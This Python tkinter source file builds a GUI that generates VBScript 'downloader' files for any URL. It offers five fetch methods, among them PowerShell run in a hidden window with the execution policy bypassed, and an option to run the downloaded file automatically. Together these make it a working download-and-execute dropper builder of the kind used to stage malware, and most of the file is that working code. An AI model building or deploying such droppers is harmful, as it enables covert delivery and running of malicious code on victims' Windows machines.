import tkinter as tk
from tkinter import filedialog, messagebox
import os
from urllib.parse import urlparse
import re

# Define the output directory
OUTPUT_DIR = r"E:\Notes\Macros\Cyber Security\Projects\scripts\VBS_Downloader\output"

def _write_vbs_file_content(url, selected_method, filename, execute_after_download, vbs_file_path):
    """
    Helper function to generate and write the .vbs file content.
    """
    vbs_content = ""

    if selected_method == "XMLHTTP & ADODB.Stream (Recommended)":
        vbs_content = f'''
Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
Dim bStrm: Set bStrm = CreateObject("ADODB.Stream")
On Error GoTo ErrorHandler

xHttp.Open "GET", "{url}", False
xHttp.Send

const adTypeBinary = 1
bStrm.Type = adTypeBinary
bStrm.Open
bStrm.Write xHttp.ResponseBody
bStrm.SaveToFile "{filename}", 2 ' 1 = no overwrite, 2 = overwrite
bStrm.Close
Set bStrm = Nothing
Set xHttp = Nothing
WScript.Echo "Download complete: {filename}"
WScript.Quit

ErrorHandler:
    WScript.Echo "An error occurred during download (XMLHTTP & ADODB.Stream): " & Err.Description
    WScript.Quit 1
        '''
    elif selected_method == "WinHttp.WinHttpRequest.5.1":
        vbs_content = f'''
Dim objHTTP: Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
Dim objStream: Set objStream = CreateObject("ADODB.Stream")
On Error GoTo ErrorHandler

objHTTP.Open "GET", "{url}", False
objHTTP.Send

If objHTTP.Status = 200 Then
    objStream.Open
    objStream.Type = 1 ' adTypeBinary
    objStream.Write objHTTP.ResponseBody
    objStream.SaveToFile "{filename}", 2 ' adSaveCreateOverWrite
    objStream.Close
    Set objStream = Nothing
Else
    WScript.Echo "Error during download (WinHttp): HTTP Status: " & objHTTP.Status
    WScript.Quit 1
End If
Set objHTTP = Nothing
WScript.Echo "Download complete: {filename}"
WScript.Quit

ErrorHandler:
    WScript.Echo "An error occurred during download (WinHttp): " & Err.Description
    WScript.Quit 1
        '''
    elif selected_method == "BITS (Background Intelligent Transfer Service)":
        # BITS requires admin privileges usually and is more complex
        # This is a simplified example, a full BITS implementation would be more involved
        vbs_content = f'''
On Error GoTo ErrorHandler
Dim BITS, Job
Const BG_JOB_TYPE_DOWNLOAD = 0
Const BG_JOB_STATE_TRANSFERRED = 5
Const BG_JOB_STATE_ERROR = 7
Const BG_JOB_STATE_TRANSIENT_ERROR = 8

Set BITS = CreateObject("Bits.Manager")
If Err.Number <> 0 Then
    WScript.Echo "Error creating BITS manager object. Make sure BITS is enabled and you have sufficient permissions."
    WScript.Quit 1
End If

Dim jobName: jobName = "VBSDownload_" & Replace(Replace(Replace(Replace("{url}", "http://", ""), "https://", ""), "/", "_"), ".", "_")
Set Job = BITS.CreateJob(jobName, BG_JOB_TYPE_DOWNLOAD)
If Err.Number <> 0 Then
    WScript.Echo "Error creating BITS job: " & Err.Description
    WScript.Quit 1
End If

Job.AddFile "{url}", "{filename}"
If Err.Number <> 0 Then
    WScript.Echo "Error adding file to BITS job: " & Err.Description
    BITS.CancelJob Job.GetId
    WScript.Quit 1
End If

Job.Resume
WScript.Echo "BITS download started for {filename}. Monitoring progress..."

Dim jobState
Do While True
    WScript.Sleep 1000 ' Wait 1 second
    jobState = Job.GetState
    Select Case jobState
        Case BG_JOB_STATE_TRANSFERRED
            Job.Complete
            WScript.Echo "BITS Download complete: {filename}"
            Exit Do
        Case BG_JOB_STATE_ERROR, BG_JOB_STATE_TRANSIENT_ERROR
            WScript.Echo "BITS Download error. State: " & jobState & ", Description: " & Job.GetError.GetErrorDescription
            Job.Cancel
            WScript.Quit 1
        Case Else
            ' Continue waiting
    End Select
Loop

Set Job = Nothing
Set BITS = Nothing
WScript.Quit

ErrorHandler:
    WScript.Echo "An unexpected error occurred during BITS download: " & Err.Description
    WScript.Quit 1
        '''
    elif selected_method == "PowerShell (Invoke-WebRequest)":
        vbs_content = f'''
Dim objShell: Set objShell = CreateObject("WScript.Shell")
Dim command
command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command ""Invoke-WebRequest -Uri '{url}' -OutFile '{filename}' -ErrorAction Stop"""
WScript.Echo "Executing PowerShell (Invoke-WebRequest) command..."
Dim exitCode: exitCode = objShell.Run(command, 0, True) ' 0 for hidden window, True to wait for completion

If exitCode = 0 Then
    WScript.Echo "Download complete: {filename}"
Else
    WScript.Echo "PowerShell (Invoke-WebRequest) download failed. Exit code: " & exitCode & ". Ensure PowerShell 3.0+ is installed."
End If
Set objShell = Nothing
WScript.Quit
        '''
    elif selected_method == "PowerShell (WebClient)":
        vbs_content = f'''
Dim objShell: Set objShell = CreateObject("WScript.Shell")
Dim command
command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command ""$wc = New-Object System.Net.WebClient; $wc.DownloadFile('{url}', '{filename}'); if ($?) {{ Write-Host 'Download Success' }} else {{ Write-Host 'Download Failed' }}"""
WScript.Echo "Executing PowerShell (WebClient) command..."
Dim exitCode: exitCode = objShell.Run(command, 0, True) ' 0 for hidden window, True to wait for completion

If exitCode = 0 Then
    WScript.Echo "Download complete: {filename}"
Else
    WScript.Echo "PowerShell (WebClient) download failed. Exit code: " & exitCode & ". Ensure PowerShell is installed."
End If
Set objShell = Nothing
WScript.Quit
        '''
    else:
        raise ValueError(f"Unknown download method selected: {selected_method}")

    # Add post-download execution
    if execute_after_download:
        vbs_content += f'\n' \
                       f'Dim objFSO: Set objFSO = CreateObject("Scripting.FileSystemObject")\n' \
                       f'If objFSO.FileExists("{filename}") Then\n' \
                       f'    Dim objShellExe: Set objShellExe = CreateObject("WScript.Shell")\n' \
                       f'    WScript.Echo "Executing downloaded file..."\n' \
                       f'    objShellExe.Run "{filename}", 1, False\n' \
                       f'    Set objShellExe = Nothing\n' \
                       f'Else\n' \
                       f'    WScript.Echo "Cannot execute: Downloaded file not found."\n' \
                       f'End If\n' \
                       f'Set objFSO = Nothing\n'


    # Write the content to the .vbs file
    with open(vbs_file_path, 'w') as f:
        f.write(vbs_content)

def generate_single_vbs_file():
    """
    Generates a single .vbs file for the selected method, prompting for save location.
    """
    url = url_entry.get()
    selected_method = method_var.get()
    execute_after_download = execute_var.get()

    if not url:
        messagebox.showwarning("Input Error", "Please enter a valid URL.")
        return

    if not (url.startswith("http://") or url.startswith("https://") or url.startswith("ftp://")):
        messagebox.showwarning("Invalid URL", "URL must start with http://, https://, or ftp://")
        return
    
    if "BITS" in selected_method and not (url.startswith("http://") or url.startswith("https://")):
        messagebox.showwarning("BITS Method Error", "BITS method primarily supports HTTP/HTTPS URLs.")
        return
    
    # FTP URLs for PowerShell methods might not work directly without specific handling in PowerShell itself
    if "PowerShell" in selected_method and url.startswith("ftp://"):
        messagebox.showwarning("PowerShell Method Warning", "PowerShell's Invoke-WebRequest and WebClient might have limited or no direct support for FTP URLs. Consider HTTP/HTTPS or a dedicated FTP client.")
        # User can proceed, but they are warned.

    try:
        parsed_url = urlparse(url)
        path_segments = parsed_url.path.split('/')
        filename = path_segments[-1] if path_segments[-1] else "downloaded_file"
        if '.' not in filename:
            filename += ".dat"

        # Sanitize filename for VBScript compatibility
        filename = re.sub(r'[\\/:*?"<>|]', '_', filename) # Replace invalid chars with underscore

        vbs_file_path = filedialog.asksaveasfilename(
            defaultextension=".vbs",
            filetypes=[("VBScript Files", "*.vbs")],
            initialfile=f"download_with_{selected_method.split(' ')[0].lower()}.vbs",
            title="Save .vbs File As"
        )

        if not vbs_file_path:
            return

        _write_vbs_file_content(url, selected_method, filename, execute_after_download, vbs_file_path)

        messagebox.showinfo(
            "Success",
            f"'{os.path.basename(vbs_file_path)}' created successfully!\n"
            f"You can find it at: {vbs_file_path}\n\n"
            f"Double-click the .vbs file to start the download (requires cscript/wscript)."
        )

    except Exception as e:
        messagebox.showerror("Error", f"An error occurred: {e}")

def create_all_vbs_files():
    """
    Creates a .vbs file for each download method in the specified output directory.
    """
    url = url_entry.get()
    execute_after_download = execute_var.get()

    if not url:
        messagebox.showwarning("Input Error", "Please enter a valid URL to create all files.")
        return

    if not (url.startswith("http://") or url.startswith("https://") or url.startswith("ftp://")):
        messagebox.showwarning("Invalid URL", "URL must start with http://, https://, or ftp://")
        return

    try:
        # Create output directory if it doesn't exist
        os.makedirs(OUTPUT_DIR, exist_ok=True)

        parsed_url = urlparse(url)
        path_segments = parsed_url.path.split('/')
        base_filename = path_segments[-1] if path_segments[-1] else "downloaded_file"
        if '.' not in base_filename:
            base_filename += ".dat"
        
        # Sanitize base_filename for VBScript compatibility
        base_filename = re.sub(r'[\\/:*?"<>|]', '_', base_filename)

        created_files_count = 0
        failed_methods = []

        for method in download_methods:
            # Skip BITS method if URL is not HTTP/HTTPS
            if "BITS" in method and not (url.startswith("http://") or url.startswith("https://")):
                failed_methods.append(f"{method} (BITS requires HTTP/HTTPS URL)")
                continue
            
            # Skip PowerShell methods warning if URL is FTP
            if "PowerShell" in method and url.startswith("ftp://"):
                failed_methods.append(f"{method} (PowerShell WebCmdlets might not support FTP URLs directly)")
                continue

            # Sanitize method name for filename
            sanitized_method_name = re.sub(r'[\\/:*?"<>|()]', '', method).replace(' ', '_').replace('.', '').replace('&', '')
            
            # Construct the filename for the output vbs file
            vbs_filename = f"download_{sanitized_method_name}.vbs"
            vbs_file_path = os.path.join(OUTPUT_DIR, vbs_filename)

            try:
                _write_vbs_file_content(url, method, base_filename, execute_after_download, vbs_file_path)
                created_files_count += 1
            except Exception as e:
                failed_methods.append(f"{method} ({e})")

        success_message = f"Successfully created {created_files_count} .vbs files in:\n{OUTPUT_DIR}"
        if failed_methods:
            success_message += "\n\nFailed to create files for the following methods:\n" + "\n".join(failed_methods)
            messagebox.showwarning("Partial Success", success_message)
        else:
            messagebox.showinfo("Success", success_message)

    except Exception as e:
        messagebox.showerror("Error", f"An error occurred while creating all files: {e}")

# --- GUI Setup ---
app = tk.Tk()
app.title("VBS File Downloader Generator")
app.geometry("650x450") # Slightly increased size
app.resizable(False, False)

# Configure grid for better layout
for i in range(5):
    app.grid_rowconfigure(i, weight=1)
app.grid_columnconfigure(0, weight=1)
app.grid_columnconfigure(1, weight=3)

# URL Label
url_label = tk.Label(app, text="Enter File URL:")
url_label.grid(row=0, column=0, padx=10, pady=10, sticky="e")

# URL Entry
url_entry = tk.Entry(app, width=50)
url_entry.grid(row=0, column=1, padx=10, pady=10, sticky="w")
url_entry.focus_set()

# Download Method Label
method_label = tk.Label(app, text="Select Download Method:")
method_label.grid(row=1, column=0, padx=10, pady=10, sticky="e")

# Download Method Dropdown (OptionMenu)
download_methods = [
    "XMLHTTP & ADODB.Stream (Recommended)",
    "WinHttp.WinHttpRequest.5.1",
    "BITS (Background Intelligent Transfer Service)",
    "PowerShell (Invoke-WebRequest)",
    "PowerShell (WebClient)"
]
method_var = tk.StringVar(app)
method_var.set(download_methods[0]) # Set default value

method_dropdown = tk.OptionMenu(app, method_var, *download_methods)
method_dropdown.config(width=40) # Adjust width
method_dropdown.grid(row=1, column=1, padx=10, pady=10, sticky="w")

# Execute After Download Checkbox
execute_var = tk.BooleanVar() # Variable to store checkbox state
execute_checkbox = tk.Checkbutton(app, text="Execute after download", variable=execute_var)
execute_checkbox.grid(row=2, column=1, padx=10, pady=5, sticky="w")

# Buttons
generate_button = tk.Button(app, text="Generate Single .VBS File", command=generate_single_vbs_file)
generate_button.grid(row=3, column=0, columnspan=2, pady=10)

create_all_button = tk.Button(app, text="Create All Methods", command=create_all_vbs_files)
create_all_button.grid(row=4, column=0, columnspan=2, pady=10)

# Run the application
app.mainloop()